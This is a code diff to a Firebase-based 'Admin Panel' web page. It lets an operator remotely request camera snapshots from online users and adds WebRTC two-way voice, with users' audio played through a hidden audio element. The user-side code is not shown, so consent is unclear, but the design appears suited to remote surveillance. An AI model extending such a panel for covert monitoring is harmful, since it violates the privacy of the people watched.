@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Photo Request</title>
+    <title>Admin Panel - Voice & Photo</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -17,7 +17,7 @@
 <body class="bg-gray-900 text-white min-h-screen p-4">
 
     <div class="container mx-auto">
-        <h1 class="text-3xl font-bold text-center mb-2">User Snapshots</h1>
+        <h1 class="text-3xl font-bold text-center mb-2">User Dashboard</h1>
         <p class="text-center text-gray-400 mb-6">Online Users: <span id="userCount">0</span></p>
 
         <!-- User Photo Grid -->
@@ -25,6 +25,9 @@
             <!-- User cards will be populated here -->
         </div>
     </div>
+    
+    <!-- Hidden audio container for user streams -->
+    <div id="user-audio-container" class="hidden"></div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-app.js";
@@ -42,14 +45,20 @@
             appId: "1:972654270500:web:c29a42a09972f5a4ce20b1",
             databaseURL: "https://my-voice-app-4eca5-default-rtdb.asia-southeast1.firebasedatabase.app"
         };
+        
+        // --- WebRTC Configuration ---
+        const servers = { iceServers: [{ urls: ['stun:stun.l.google.com:19302'] }] };
 
         // --- DOM Elements ---
         const userGridEl = document.getElementById('user-grid');
         const userCountEl = document.getElementById('userCount');
+        const userAudioContainer = document.getElementById('user-audio-container');
         
         // --- App State ---
         let db, rtdb;
-        let userListeners = {}; 
+        let adminMicStream;
+        let userConnections = {}; // Stores photo and voice connections
+        let visualizers = {};
 
         // --- Main Initialization ---
         async function initialize() {
@@ -59,6 +68,9 @@
                 const auth = getAuth(app);
                 rtdb = getDatabase(app);
                 await signInAnonymously(auth);
+
+                adminMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                adminMicStream.getTracks().forEach(track => track.enabled = false); // Start muted
 
                 listenToUsers();
             } catch (e) { console.error("Initialization failed:", e); }
@@ -73,22 +85,17 @@
                 userCountEl.textContent = onlineUsers.size;
 
                 onlineUsers.forEach(userId => {
-                    if (!userListeners[userId]) {
-                        setupUserCard(userId);
-                    }
+                    if (!userConnections[userId]) setupUserCard(userId);
                 });
 
-                Object.keys(userListeners).forEach(userId => {
-                    if (!onlineUsers.has(userId)) {
-                        removeUserCard(userId);
-                    }
+                Object.keys(userConnections).forEach(userId => {
+                    if (!onlineUsers.has(userId)) removeUserCard(userId);
                 });
             });
         }
         
         function setupUserCard(userId) {
             // UI banayein
-            if (document.getElementById(`user_card_${userId}`)) return;
             const userCard = document.createElement('div');
             userCard.id = `user_card_${userId}`;
             userCard.className = 'user-card bg-slate-800 rounded-lg overflow-hidden shadow-lg';
@@ -98,47 +105,134 @@
                     <i id="placeholder_${userId}" class="fas fa-camera text-4xl text-gray-500"></i>
                 </div>
                 <div class="p-3">
-                    <p class="text-sm font-semibold">User-${userId.substring(0, 6)}</p>
-                    <button data-userid="${userId}" class="request-photo-btn mt-2 w-full bg-blue-600 hover:bg-blue-700 px-2 py-1 text-sm rounded">Request Photo</button>
+                    <div class="flex items-center justify-between">
+                        <p class="text-sm font-semibold">User-${userId.substring(0, 6)}</p>
+                        <canvas id="viz_${userId}" class="w-10 h-4"></canvas>
+                    </div>
+                    <div class="flex space-x-2 mt-2">
+                        <button data-userid="${userId}" class="request-photo-btn w-full bg-blue-600 hover:bg-blue-700 px-2 py-1 text-sm rounded">Request Photo</button>
+                        <button data-userid="${userId}" class="talk-btn w-full bg-green-600 hover:bg-green-700 px-2 py-1 text-sm rounded">Talk</button>
+                    </div>
                 </div>
             `;
             userGridEl.appendChild(userCard);
             userCard.querySelector('.request-photo-btn').addEventListener('click', (e) => requestPhoto(userId, e.target));
+            userCard.querySelector('.talk-btn').addEventListener('click', (e) => talkToUser(userId, e.target));
 
             // User se photo ke liye listen karein
-            const userCallDocRef = doc(db, 'photo_calls', userId);
-            const unsubscribe = onSnapshot(userCallDocRef, (snapshot) => {
+            const photoCallDocRef = doc(db, 'photo_calls', userId);
+            const photoUnsubscribe = onSnapshot(photoCallDocRef, (snapshot) => {
                 const data = snapshot.data();
-                if (data && data.photo_data) {
-                    const imgEl = document.getElementById(`photo_${userId}`);
-                    const placeholderEl = document.getElementById(`placeholder_${userId}`);
-                    imgEl.src = data.photo_data;
-                    imgEl.classList.remove('hidden');
-                    placeholderEl.classList.add('hidden');
+                if (data?.photo_data) {
+                    document.getElementById(`photo_${userId}`).src = data.photo_data;
+                    document.getElementById(`photo_${userId}`).classList.remove('hidden');
+                    document.getElementById(`placeholder_${userId}`).classList.add('hidden');
                 }
             });
 
-            userListeners[userId] = { unsubscribe };
+            userConnections[userId] = { photoUnsubscribe, voiceConnection: null, voiceUnsubscribe: null };
+        }
+        
+        async function requestPhoto(userId, button) {
+            const photoCallDocRef = doc(db, 'photo_calls', userId);
+            await setDoc(photoCallDocRef, { request_photo: true, timestamp: Date.now() });
+            button.textContent = "Sent";
+            setTimeout(() => { button.textContent = "Request Photo"; }, 3000);
         }
 
-        async function requestPhoto(userId, button) {
-            const userCallDocRef = doc(db, 'photo_calls', userId);
-            await setDoc(userCallDocRef, { request_photo: true, timestamp: Date.now() });
-            button.textContent = "Request Sent";
-            button.disabled = true;
-            setTimeout(() => {
-                button.textContent = "Request Photo";
-                button.disabled = false;
-            }, 5000);
+        async function talkToUser(userId, button) {
+            // Toggle talk
+            if (userConnections[userId].voiceConnection) {
+                userConnections[userId].voiceConnection.close();
+                userConnections[userId].voiceUnsubscribe();
+                userConnections[userId].voiceConnection = null;
+                button.textContent = "Talk";
+                button.classList.replace('bg-red-600', 'bg-green-600');
+                adminMicStream.getTracks().forEach(track => track.enabled = false);
+                return;
+            }
+
+            // Start new talk
+            button.textContent = "Stop";
+            button.classList.replace('bg-green-600', 'bg-red-600');
+            adminMicStream.getTracks().forEach(track => track.enabled = true);
+
+            const pc = new RTCPeerConnection(servers);
+            userConnections[userId].voiceConnection = pc;
+
+            adminMicStream.getTracks().forEach(track => pc.addTrack(track, adminMicStream));
+
+            pc.ontrack = (event) => {
+                let audioEl = document.getElementById(`audio_${userId}`);
+                if (!audioEl) {
+                    audioEl = document.createElement('audio');
+                    audioEl.id = `audio_${userId}`;
+                    audioEl.autoplay = true;
+                    userAudioContainer.appendChild(audioEl);
+                }
+                audioEl.srcObject = event.streams[0];
+                setupVisualizer(userId, event.streams[0]);
+            };
+
+            const voiceCallDocRef = doc(db, 'voice_calls', userId);
+            const adminCandidatesRef = collection(voiceCallDocRef, 'adminCandidates');
+            const clientCandidatesRef = collection(voiceCallDocRef, 'clientCandidates');
+
+            pc.onicecandidate = e => e.candidate && addDoc(adminCandidatesRef, e.candidate.toJSON());
+            onSnapshot(clientCandidatesRef, (snapshot) => snapshot.docChanges().forEach((change) => {
+                if(change.type === 'added') pc.addIceCandidate(new RTCIceCandidate(change.doc.data()));
+            }));
+            
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            await setDoc(voiceCallDocRef, { offer });
+
+            userConnections[userId].voiceUnsubscribe = onSnapshot(voiceCallDocRef, (snapshot) => {
+                const data = snapshot.data();
+                if (data?.answer && pc.signalingState === 'have-local-offer') {
+                    pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+                }
+            });
         }
         
         function removeUserCard(userId) {
-            if (userListeners[userId]) {
-                userListeners[userId].unsubscribe();
-                delete userListeners[userId];
+            if (userConnections[userId]) {
+                userConnections[userId].photoUnsubscribe();
+                if (userConnections[userId].voiceConnection) userConnections[userId].voiceConnection.close();
+                if (userConnections[userId].voiceUnsubscribe) userConnections[userId].voiceUnsubscribe();
+                delete userConnections[userId];
             }
             const userCard = document.getElementById(`user_card_${userId}`);
             if (userCard) userCard.remove();
+        }
+
+        // --- Visualizer Logic ---
+        function setupVisualizer(userId, stream) {
+            const canvas = document.getElementById(`viz_${userId}`);
+            if (!canvas) return;
+            const canvasCtx = canvas.getContext('2d');
+            const audioCtx = new AudioContext();
+            const source = audioCtx.createMediaStreamSource(stream);
+            const analyser = audioCtx.createAnalyser();
+            analyser.fftSize = 32;
+            source.connect(analyser);
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            visualizers[userId] = { animationFrameId: null };
+            function draw() {
+                visualizers[userId].animationFrameId = requestAnimationFrame(draw);
+                analyser.getByteFrequencyData(dataArray);
+                canvasCtx.clearRect(0, 0, canvas.width, canvas.height);
+                const barWidth = canvas.width / bufferLength;
+                let x = 0;
+                for(let i = 0; i < bufferLength; i++) {
+                    const barHeight = dataArray[i] / 15;
+                    canvasCtx.fillStyle = '#4ade80'; // green-400
+                    canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+                    x += barWidth;
+                }
+            }
+            draw();
         }
 
         initialize();
